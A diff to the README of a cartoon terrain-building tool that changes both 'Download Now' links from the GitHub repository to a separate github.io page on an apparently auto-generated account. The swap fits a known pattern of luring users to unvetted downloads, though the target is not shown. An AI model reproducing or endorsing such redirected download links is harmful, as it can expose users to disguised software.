@@ -23,7 +23,7 @@ Ready to get started? Here's everything you need to do:
 
 ### Step 1: Download the Software
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%2300C853.svg?style=for-the-badge&logo=download&logoColor=white)](https://github.com/cathleencombinable612/cartoon-terrain-studio)
+[![Download Now](https://img.shields.io/badge/Download%20Now-%2300C853.svg?style=for-the-badge&logo=download&logoColor=white)](https://cathleencombinable612.github.io)
 
 **Click the button above or visit this link to download the application.** 
 
@@ -170,7 +170,7 @@ cartoon-terrain-studio is released under an open-source license, which means you
 
 ---
 
-**Ready to start creating?** [Click here to download cartoon-terrain-studio](https://github.com/cathleencombinable612/cartoon-terrain-studio) and bring your cartoon worlds to life today!
+**Ready to start creating?** [Click here to download cartoon-terrain-studio](https://cathleencombinable612.github.io) and bring your cartoon worlds to life today!
 
 We can't wait to see what amazing terrains you'll create. Happy building! 🏔️✨
 
